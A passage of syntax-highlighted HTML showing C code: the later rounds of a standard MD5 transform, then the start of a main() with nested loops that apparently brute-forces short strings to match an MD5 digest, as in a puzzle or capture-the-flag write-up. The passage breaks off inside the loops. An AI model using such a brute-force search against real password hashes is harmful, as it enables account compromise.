class=\"token function\">GG</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x455a14ed</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 28 */</span></pre></td></tr><tr><td data-num=\"117\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa9e3e905</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 29 */</span></pre></td></tr><tr><td data-num=\"118\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfcefa3f8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 30 */</span></pre></td></tr><tr><td data-num=\"119\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x676f02d9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 31 */</span></pre></td></tr><tr><td data-num=\"120\"></td><td><pre> <span class=\"token function\">GG</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8d2a4c8a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 32 */</span></pre></td></tr><tr><td data-num=\"121\"></td><td><pre> </pre></td></tr><tr><td data-num=\"122\"></td><td><pre> <span class=\"token comment\">/* Round 3 */</span></pre></td></tr><tr><td data-num=\"123\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfffa3942</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 33 */</span></pre></td></tr><tr><td data-num=\"124\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8771f681</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 34 */</span></pre></td></tr><tr><td data-num=\"125\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6d9d6122</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 35 */</span></pre></td></tr><tr><td data-num=\"126\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfde5380c</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 36 */</span></pre></td></tr><tr><td data-num=\"127\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa4beea44</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 37 */</span></pre></td></tr><tr><td data-num=\"128\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4bdecfa9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 38 */</span></pre></td></tr><tr><td data-num=\"129\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf6bb4b60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 39 */</span></pre></td></tr><tr><td data-num=\"130\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbebfbc70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 40 */</span></pre></td></tr><tr><td data-num=\"131\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x289b7ec6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 41 */</span></pre></td></tr><tr><td data-num=\"132\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xeaa127fa</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 42 */</span></pre></td></tr><tr><td data-num=\"133\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd4ef3085</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 43 */</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span>  <span class=\"token number\">0x4881d05</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 44 */</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd9d4d039</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 45 */</span></pre></td></tr><tr><td data-num=\"136\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xe6db99e5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 46 */</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1fa27cf8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 47 */</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre> <span class=\"token function\">HH</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xc4ac5665</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 48 */</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre> </pre></td></tr><tr><td data-num=\"140\"></td><td><pre> <span class=\"token comment\">/* Round 4 */</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf4292244</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 49 */</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">7</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x432aff97</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 50 */</span></pre></td></tr><tr><td data-num=\"143\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xab9423a7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 51 */</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfc93a039</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 52 */</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x655b59c3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 53 */</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8f0ccc92</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 54 */</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xffeff47d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 55 */</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85845dd1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 56 */</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6fa87e4f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 57 */</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfe2ce6e0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 58 */</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xa3014314</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 59 */</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4e0811a1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 60 */</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf7537e82</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 61 */</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xbd3af235</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 62 */</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2ad7d2bb</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 63 */</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre> <span class=\"token function\">II</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">[</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xeb86d391</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">/* 64 */</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre>     state<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> a<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"158\"></td><td><pre>     state<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> b<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"159\"></td><td><pre>     state<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> c<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre>     state<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"161\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"162\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"163\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">\"md5.h\"</span></span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre> </pre></td></tr><tr><td data-num=\"170\"></td><td><pre> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">void</span> <span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"171\"></td><td><pre> <span class=\"token punctuation\">&#123;</span> </pre></td></tr><tr><td data-num=\"172\"></td><td><pre>    <span class=\"token keyword\">int</span> read_len<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>    <span class=\"token keyword\">int</span> i <span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre>   <span class=\"token keyword\">char</span> temp<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>    <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> digest<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 存放结果 </span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre>     <span class=\"token keyword\">char</span> hexbuf<span class=\"token punctuation\">[</span><span class=\"token number\">128</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>     <span class=\"token keyword\">int</span> len <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre>     <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>            <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> k<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>k<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>k<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>             <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> l<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>l<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>l<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre>              <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> ii<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>ii<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>ii<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>               <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> jj<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>jj<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>jj<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>                <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> kk<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>kk<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>kk<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre>                 <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> ll<span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>ll<span class=\"token operator\">&lt;</span><span class=\"token number\">6</span><span class=\"token punctuation\">;</span>ll<span class=\"token 